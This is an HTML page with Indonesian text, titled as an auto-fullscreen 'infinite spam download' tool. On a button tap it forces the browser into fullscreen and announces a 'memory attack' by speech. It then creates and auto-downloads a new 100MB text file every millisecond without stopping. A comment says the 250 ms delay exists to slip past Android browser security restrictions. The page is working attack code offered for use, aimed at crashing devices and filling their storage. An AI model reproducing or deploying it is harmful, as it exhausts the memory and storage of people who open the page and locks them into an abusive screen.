<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Auto Fullscreen & Infinite Spam Download (1ms x 100MB)</title>

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Arial, sans-serif;
      background: #f4f6f8;
      color: #222;
      padding: 20px;
    }
    .panel {
      background: #fff;
      padding: 24px;
      border-radius: 12px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
      max-width: 650px;
      margin: 40px auto;
    }
    /* Mengunci tampilan saat layar penuh */
    :fullscreen {
      background: #000000 !important;
      color: #00ff00 !important;
      padding: 20px !important;
      overflow-y: auto !important;
      width: 100vw !important;
      height: 100vh !important;
    }
    :-webkit-full-screen {
      background: #000000 !important;
      color: #00ff00 !important;
      padding: 20px !important;
      overflow-y: auto !important;
    }
    button {
      width: 100%;
      padding: 16px;
      cursor: pointer;
      border: 0;
      border-radius: 6px;
      background: #ff0000; 
      color: #fff;
      font-weight: bold;
      font-size: 16px;
      -webkit-tap-highlight-color: transparent;
      box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
    }
    #status { 
      margin-top: 16px; 
      font-weight: bold; 
      color: #ff0000; 
      padding: 10px;
      background: #ffebee;
      border-radius: 4px;
      display: inline-block;
      width: 100%;
      text-align: center;
      border: 1px solid #ffcdd2;
    }
    #downloads {
      margin-top: 20px;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
      gap: 10px;
    }
    #downloads a { 
      display: block; 
      padding: 8px;
      background: #330000;
      color: #ff3333;
      text-decoration: none;
      border-radius: 4px;
      font-size: 13px;
      text-align: center;
      border: 1px solid #ff0000;
    }
  </style>
</head>

<body>
  <div class="panel" id="main-panel">
    <h2>Mobile Auto-Fullscreen & Instant Spam</h2>
    <p style="margin-bottom: 15px;">Ketuk tombol. Halaman WAJIB masuk layar penuh dahulu, lalu membom file teks 100MB setiap 1 milidetik.</p>

    <p>
      <button id="start" type="button">⚠️ LOCK FULLSCREEN & SPAM NOW ⚠️</button>
    </p>

    <p id="status" role="status">Sistem siap.</p>
    <div id="downloads"></div>
  </div>

  <script>
    const start = document.getElementById("start");
    const status = document.getElementById("status");
    const downloads = document.getElementById("downloads");

    let objectUrls = [];
    let isLooping = false;

    // Fungsi Suara (TTS)
    const speakText = (text) => {
      if ('speechSynthesis' in window) {
        window.speechSynthesis.cancel(); 
        const utterance = new SpeechSynthesisUtterance(text);
        utterance.lang = 'id-ID'; 
        utterance.rate = 1.1;     
        window.speechSynthesis.speak(utterance);
      }
    };

    // Fungsi Asinkronus pembuat data 100MB
    const prepareBlobAsync = (i) => {
      return new Promise((resolve) => {
        queueMicrotask(() => {
          const sizeInBytes = 104857600; // 100 MB
          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); // Huruf 'A'
          const blob = new Blob([dummyTextBuffer], { type: "text/plain;charset=utf-8" });
          const url = URL.createObjectURL(blob);
          resolve({ id: i, url: url });
        });
      });
    };

    // Pemicu Unduhan Instan ke Browser
    const triggerInstantDownload = (fileData) => {
      const link = document.createElement("a");
      link.href = fileData.url;
      link.download = `spam-100mb-${String(fileData.id).padStart(3, '0')}.txt`;
      link.textContent = `File ${fileData.id} (.txt)`;
      downloads.appendChild(link);
      link.click();
    };

    start.addEventListener("click", () => {
      if (isLooping) return; 

      // Pembersihan total memori di awal klik
      objectUrls.forEach(url => URL.revokeObjectURL(url));
      objectUrls = [];
      downloads.replaceChildren();

      // ==========================================
      // TAHAP 1: HARUS MASUK FULLSCREEN DULU (MURNI TANPA BEBAN SCRIPT LAIN)
      // ==========================================
      speakText("Layar penuh diaktifkan. Bersiap memulai serangan memori.");
      
      const docEl = document.documentElement;
      try {
        if (docEl.requestFullscreen) {
          docEl.requestFullscreen();
        } else if (docEl.webkitRequestFullscreen) { // Chrome & Safari Mobile
          docEl.webkitRequestFullscreen();
        } else if (docEl.mozRequestFullScreen) {
          docEl.mozRequestFullScreen();
        }
        status.textContent = "Mengunci Layar Penuh... Silakan tunggu.";
      } catch (err) {
        console.warn("Gagal fullscreen:", err.message);
      }

      // ==========================================
      // TAHAP 2: BERI JEDA 250MS BIARKAN GRAFIK MOBILE MENGUNCI LAYAR PENUH, BARU SPAM DINYALAKAN
      // ==========================================
      setTimeout(() => {
        isLooping = true;
        let fileCounter = 1;
        
        speakText("Layar penuh terkunci. Memulai pemboman file teks sekarang.");

        setInterval(async () => {
          // Membuat berkas baru di memori
          const fileData = await prepareBlobAsync(fileCounter);
          objectUrls.push(fileData.url);
          
          // Lemparkan ke bar notifikasi unduhan ponsel
          triggerInstantDownload(fileData);
          
          status.textContent = `🚨 SPAM AKTIF! File ke-${fileCounter} (Total: ${fileCounter * 100} MB)`;

          // Suara berkala setiap kelipatan 10 unduhan
          if (fileCounter % 10 === 0) {
            speakText(`Spam mencapai ${fileCounter} file.`);
          }

          fileCounter++;
        }, 1); // Kebiri antrean setiap 1 milidetik tanpa henti
      }, 250); // Jeda 250 milidetik ini krusial untuk meloloskan restriksi keamanan browser Android!
    });
  </script>
</body>
</html>
